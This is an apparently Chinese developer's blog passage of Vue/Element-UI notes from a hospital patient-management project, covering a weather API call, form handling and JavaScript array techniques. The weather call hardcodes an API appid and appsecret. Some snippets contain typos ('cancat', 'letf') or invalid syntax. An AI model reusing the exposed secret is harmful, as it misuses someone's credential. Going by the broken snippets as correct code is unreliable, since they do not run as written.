function_">getWeather</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">// 第三方天气api接口</span><br>    axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://www.tianqiapi.com/api/&#x27;</span>, &#123;<br>      <span class="hljs-attr">params</span>: &#123;<br>        <span class="hljs-attr">appid</span>: <span class="hljs-string">&#x27;26148275&#x27;</span>,<br>        <span class="hljs-attr">appsecret</span>: <span class="hljs-string">&#x27;2id6H48Y&#x27;</span>,<br>        <span class="hljs-attr">version</span>: <span class="hljs-string">&#x27;v6&#x27;</span><br>      &#125;<br>    &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>) &#123;<br>        <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>.<span class="hljs-property">wea_img</span> == <span class="hljs-string">&#x27;xue&#x27;</span>) &#123;<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">imgSrc</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../assets/img/brand/xue.png&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>.<span class="hljs-property">wea_img</span> == <span class="hljs-string">&#x27;yin&#x27;</span>) &#123;<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">imgSrc</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../assets/img/brand/yin.png&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>.<span class="hljs-property">wea_img</span> == <span class="hljs-string">&#x27;yu&#x27;</span> || res.<span class="hljs-property">data</span>.<span class="hljs-property">wea_img</span> == <span class="hljs-string">&#x27;bingbao&#x27;</span>) &#123;<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">imgSrc</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../assets/img/brand/yu.png&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>.<span class="hljs-property">wea_img</span> == <span class="hljs-string">&#x27;yun&#x27;</span>) &#123;<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">imgSrc</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../assets/img/brand/yun.png&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>.<span class="hljs-property">wea_img</span> == <span class="hljs-string">&#x27;wu&#x27;</span>) &#123;<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">imgSrc</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../assets/img/brand/wu.png&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>.<span class="hljs-property">wea_img</span> == <span class="hljs-string">&#x27;shachen&#x27;</span>) &#123;<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">imgSrc</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../assets/img/brand/shachen.png&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span>.<span class="hljs-property">wea_img</span> == <span class="hljs-string">&#x27;lei&#x27;</span>) &#123;<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">imgSrc</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../assets/img/brand/lei.png&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">imgSrc</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../assets/img/brand/qing.png&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">weatcherData</span> = res.<span class="hljs-property">data</span>;<br>      &#125;<br>    &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)<br>    &#125;)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4、下拉框的选项触发事件"><a href="#4、下拉框的选项触发事件" class="headerlink" title="4、下拉框的选项触发事件"></a>4、下拉框的选项触发事件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;el-form-item&gt;<br>    &lt;span&gt;病&amp;nbsp;&amp;nbsp;房&amp;nbsp;&amp;nbsp;号&lt;/span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>    &lt;el-select v-model=&quot;patientForm.wardId&quot; placeholder=&quot;请选择&quot;&gt;<br>        &lt;el-option<br>                   v-for=&quot;item in bedInfo&quot;<br>                   :key=&quot;item&quot;<br>                   :label=&quot;item&quot;<br>                   :value=&quot;item&quot;<br>                   @click.native=&quot;getBedList()&quot;<br>                   &gt;<br>        &lt;/el-option&gt;<br>    &lt;/el-select&gt;<br>&lt;/el-form-item&gt;<br></code></pre></td></tr></table></figure><blockquote><p> 给vue组件绑定事件时候，必须加上native ，否则会认为监听的是来自Item组件自定义的事件。</p><p> 例子：如果使用router-link标签，加上@click事件，绑定的事件会无效因为：router-link的作用是单纯的路由跳转，会阻止click事件，你可以试试只用click不用native,事件是不会触发的。此时加上.native，才会触发事件。</p><p> &#x3D;&#x3D;这里也用到了用v-for动态生成&#x3D;&#x3D;</p></blockquote><h3 id="5、显示已有值，但可以修改"><a href="#5、显示已有值，但可以修改" class="headerlink" title="5、显示已有值，但可以修改"></a>5、显示已有值，但可以修改</h3><blockquote><p>之前在别的组件里试过很多次，为了让用户每次提交时不用修改所有值，但发现el-input这个东西会让v-model失效所以不行，但后来在写个人信息修改的时候又成了，记录在这里：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;el-card class=&quot;box-card&quot;&gt;<br>      &lt;el-form ref=&quot;personalForm&quot; :model=&quot;personalForm&quot;&gt;<br>        &lt;el-form-item&gt;<br>          &lt;span&gt;姓&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;名&lt;/span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>          &lt;el-input v-model=&quot;personalForm.name&quot; style=&quot;width: 50%;&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item&gt;<br>          &lt;span&gt;性&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;别&lt;/span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>          &lt;el-radio-group v-model=&quot;personalForm.sex&quot;&gt;<br>            &lt;el-radio label=&quot;男&quot;&gt;&lt;/el-radio&gt;<br>            &lt;el-radio label=&quot;女&quot;&gt;&lt;/el-radio&gt;<br>          &lt;/el-radio-group&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item&gt;<br>          &lt;span&gt;身份证号&lt;/span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>          &lt;el-input v-model=&quot;personalForm.idCard&quot; style=&quot;width: 50%;&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item&gt;<br>          &lt;span&gt;年&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;龄&lt;/span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>          &lt;el-input-number v-model=&quot;personalForm.age&quot; @change=&quot;handleChange&quot; :min=&quot;1&quot; :max=&quot;110&quot; label=&quot;描述文字&quot;&gt;&lt;/el-input-number&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item&gt;<br>          &lt;span&gt;生&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;日&lt;/span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>          &lt;el-date-picker v-model=&quot;personalForm.birth&quot; type=&quot;date&quot; placeholder=&quot;选择日期&quot;&gt;&lt;/el-date-picker&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item&gt;<br>          &lt;span&gt;婚&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;姻&lt;/span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>          &lt;el-radio-group v-model=&quot;personalForm.marriage&quot;&gt;<br>            &lt;el-radio label=&quot;未婚&quot;&gt;&lt;/el-radio&gt;<br>            &lt;el-radio label=&quot;已婚&quot;&gt;&lt;/el-radio&gt;<br>          &lt;/el-radio-group&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item&gt;<br>          &lt;span&gt;家庭住址&lt;/span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>          &lt;el-input v-model=&quot;personalForm.address&quot; style=&quot;width: 50%;&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-button type=&quot;primary&quot; @click=&quot;updatePatient()&quot; class=&quot;button&quot;&gt;提交&lt;/el-button&gt;<br>      &lt;/el-form&gt;<br>    &lt;/el-card&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import &#123;getPatientInfo, updatePatient&#125; from &#x27;@/api/patient&#x27;<br>import &#123;getCurrent&#125; from &#x27;@/api/login&#x27;<br><br>export default &#123;<br>  name: &#x27;PersonalInfo&#x27;,<br>  data()&#123;<br>    return&#123;<br>      updateInfo:[],<br>      personalForm: &#123;<br>        name: &#x27;&#x27;,<br>        sex: &#x27;&#x27;,<br>        idCard: &#x27;&#x27;,<br>        age: &#x27;&#x27;,<br>        birth: &#x27;&#x27;,<br>        telephone: &#x27;&#x27;,<br>        marriage: &#x27;&#x27;,<br>        address: &#x27;&#x27;<br>      &#125;,<br>      username: &#x27;&#x27;,<br>      id: &#x27;&#x27;,<br>    &#125;<br>  &#125;,<br>  mounted() &#123;<br>    this.getCurrent()<br>  &#125;,<br>  methods: &#123;<br>    handleChange(value) &#123;<br>      console.log(value);<br>    &#125;,<br>    getCurrent() &#123;<br>      getCurrent().then((res) =&gt; &#123;<br>        this.username = res.username<br>        getPatientInfo(res.id).then((res) =&gt; &#123;<br>          this.personalForm = res<br>        &#125;)<br>      &#125;)<br>    &#125;,<br>    updatePatient() &#123;<br>      console.log(&#x27;start&#x27;)<br>      getCurrent().then((res) =&gt; &#123;<br>        this.personalForm.telephone = res.id<br>        updatePatient(this.personalForm)<br>        this.$notify(&#123;<br>          title: &#x27;提示信息&#x27;,<br>          message: &#x27;更新成功&#x27;,<br>          type: &#x27;success&#x27;<br>        &#125;)<br>      &#125;)<br>    &#125;<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br>.box-card&#123;<br>  width: 60%;<br>  margin-left: 10%;<br>  margin-top: 5%;<br>&#125;<br>.button&#123;<br>  margin-left: 22%;<br>&#125;<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><h3 id="6、过滤重复值"><a href="#6、过滤重复值" class="headerlink" title="6、过滤重复值"></a>6、过滤重复值</h3><p>这个如果在sql语句里写只需要一句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span><span class="hljs-keyword">select</span> id<span class="hljs-operator">=</span>&quot;selectAllInIdle&quot; resultType<span class="hljs-operator">=</span>&quot;java.lang.Integer&quot;<span class="hljs-operator">&gt;</span><br>    <span class="hljs-keyword">select</span> <span class="hljs-keyword">DISTINCT</span> bed_info.wardId <span class="hljs-keyword">from</span> bed_info <span class="hljs-keyword">where</span> flag<span class="hljs-operator">=</span>&quot;空闲&quot;<br><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span><span class="hljs-keyword">select</span><span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p>前端也能做：</p><p>1、数组的当前项和下一项比较，如果两者相同，删除其一</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">arr.<span class="hljs-title function_">sort</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;arr.<span class="hljs-property">length</span>;i++)&#123;<br>    <span class="hljs-keyword">if</span>(arr[i] == arr[i+<span class="hljs-number">1</span>])&#123;<br>        arr.<span class="hljs-title function_">splice</span>(i,<span class="hljs-number">1</span>)<br>        i--<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr)<br></code></pre></td></tr></table></figure><p>2、利用对象的key是唯一的进行操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> json = &#123;&#125;;<br><span class="hljs-keyword">var</span> newArr = [];<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;arr.<span class="hljs-property">length</span>;i++)&#123;<br>    <span class="hljs-keyword">if</span>(!json[arr[i]])&#123;<br>        json[arr[i]] = <span class="hljs-literal">true</span>;<br>        newArr.<span class="hljs-title function_">push</span>(arr[i]);<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newArr);<br></code></pre></td></tr></table></figure><p>3、利用indexOf操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> newArr = [];<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;arr.<span class="hljs-property">length</span>;i++)&#123;<br>    <span class="hljs-keyword">if</span>(newArr.<span class="hljs-title function_">indexOf</span>(arr[i]) == -<span class="hljs-number">1</span>)&#123;<br>        newArr.<span class="hljs-title function_">push</span>(arr[i]);<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newArr);<br></code></pre></td></tr></table></figure><p>另附：&#x3D;&#x3D;vue处理数组的几种方法&#x3D;&#x3D;</p><p><strong>数组追加</strong></p><p>项目里的写法是：<code>arr = arr.cancat(res[i])</code></p><p>写法二：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">array.<span class="hljs-title function_">push</span>(element1[, ...[, elementN]])<br><span class="hljs-keyword">const</span> array = []<br><br>array.<span class="hljs-title function_">push</span>(<span class="hljs-number">1</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(array) <span class="hljs-comment">//=&gt; [1]</span><br><br>array.<span class="hljs-title function_">push</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(array) <span class="hljs-comment">//=&gt; [1, 2, 3]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(array.<span class="hljs-property">length</span>) <span class="hljs-comment">//=&gt; 3</span><br></code></pre></td></tr></table></figure><p><strong>首端添加</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">array.<span class="hljs-title function_">unshift</span>(element1[, ...[, elementN]])<br><span class="hljs-keyword">const</span> array = [ <span class="hljs-number">4</span>, <span class="hljs-number">5</span> ]<br><br>array.<span class="hljs-title function_">unshift</span>(<span class="hljs-number">3</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(array) <span class="hljs-comment">//=&gt; [3, 4, 5]</span><br><br>array.<span class="hljs-title function_">unshift</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(array) <span class="hljs-comment">//=&gt; [1, 2, 3, 4, 5]</span><br></code></pre></td></tr></table></figure><p><strong>插入到中间某位置</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">array.<span class="hljs-title function_">splice</span>(start, deleteCount, element1[, ...[, elementN]])<br><span class="hljs-string">`第二个参数是删除若干个元素，设置0为不删除任何元素`</span><br><span class="hljs-keyword">const</span> array = [ <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span> ]<br><br>array.<span class="hljs-title function_">splice</span>(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(array) <span class="hljs-comment">//=&gt; [1, 2, 3, 6, 7]</span><br><br>array.<span class="hljs-title function_">splice</span>(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(array) <span class="hljs-comment">//=&gt; [1, 2, 3, 4, 5, 6, 7]</span><br></code></pre></td></tr></table></figure><p><strong>删除某位置元素</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">array.<span class="hljs-title function_">splice</span>(start, deleteCount, element1[, ...[, elementN]])<br><span class="hljs-keyword">const</span> array = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br><br>array.<span class="hljs-title function_">splice</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(array) <span class="hljs-comment">//=&gt; [1, 2, 3, 4, 5]</span><br></code></pre></td></tr></table></figure><p><strong>替换数组某元素</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">1.</span><br><span class="hljs-keyword">const</span> array = [ <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span> ]<br><br>array[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(array) <span class="hljs-comment">//=&gt; [10, 2, 3, 4, 5]</span><br><br><span class="hljs-number">2.</span><br><span class="hljs-keyword">const</span> array = [ <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span> ]<br>array.<span class="hljs-title function_">splice</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(array) <span class="hljs-comment">//=&gt; [ 1, 6, 3, 4, 5 ]</span><br><br><span class="hljs-comment">//splice(inde,howmany,item)参数 描述</span><br><span class="hljs-comment">//index   必需。规定从何处添加/删除元素。该参数是开始插入和（或）删除的数组元素的下标，必须是数字。</span><br><span class="hljs-comment">//howmany 必需。规定应该删除多少元素。必须是数字，但可以是 &quot;0&quot;。如果未规定此参数，则删除从 index 开始到原数组结尾的所有元素。</span><br><span class="hljs-comment">//item，要添加到数组的新元素</span><br></code></pre></td></tr></table></figure><p><strong>过滤器</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">array.<span class="hljs-title function_">filter</span>(fn)<br><span class="hljs-keyword">const</span> array = [ <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span> ]<br><span class="hljs-keyword">const</span> evenNumbers = array.<span class="hljs-title function_">filter</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">x</span>) &#123;<br>  <span class="hljs-keyword">return</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span><br>&#125;)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(evenNumbers) <span class="hljs-comment">//=&gt; [2, 4, 6, 8]</span><br></code></pre></td></tr></table></figure><p><strong>数据转换</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> array = [ <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span> ]<br><br><span class="hljs-keyword">const</span> addedArray = array.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">x</span>) &#123;<br>  <span class="hljs-keyword">return</span> x + <span class="hljs-number">2</span><br>&#125;)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(addedArray) <span class="hljs-comment">//=&gt; [3,4,5,6,7]</span><br></code></pre></td></tr></table></figure><p><strong>聚合函数</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> array = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br><br><span class="hljs-number">1.</span><br>array.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">left,right</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> left + right<br>&#125;)<br><br><span class="hljs-string">`针对每次所需要用到的聚合情况做些封装`</span><br><span class="hljs-keyword">const</span> arrayUtils = &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">array</span>) &#123;<br>    <span class="hljs-keyword">return</span>  array.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">left,right</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">return</span> letf + right<br>    &#125;)<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">multi</span>(<span class="hljs-params">array</span>) &#123;<br>    <span class="hljs-keyword">return</span> array.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">left,right</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">return</span> left * right<br>    &#125;)<br>  &#125;<br>&#125; <br><br><span class="hljs-string">`或者更为抽象的方式，涉及一些函数式编程的概念`</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reduceFn</span>(<span class="hljs-params">fn</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">array</span>) &#123;<br>    <span class="hljs-keyword">return</span> array.<span class="hljs-title function_">reduce</span>(fn)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>判断两个数组中一个是否完全包含另一个</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">isInclude (aa, bb) &#123;<br>            <span class="hljs-keyword">return</span> aa.<span class="hljs-title function_">every</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">return</span> bb.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">sub</span>) =&gt;</span> &#123;<br>                    <span class="hljs-keyword">return</span> sub === item;<br>                &#125;);<br>            &#125;);<br>        &#125;,<br></code></pre></td></tr></table></figure><p><strong>数组去重，返回新数组</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">isInclude (aa, bb) &#123;<br>            <span class="hljs-keyword">return</span> aa.<span class="hljs-title function_">every</span>(<span 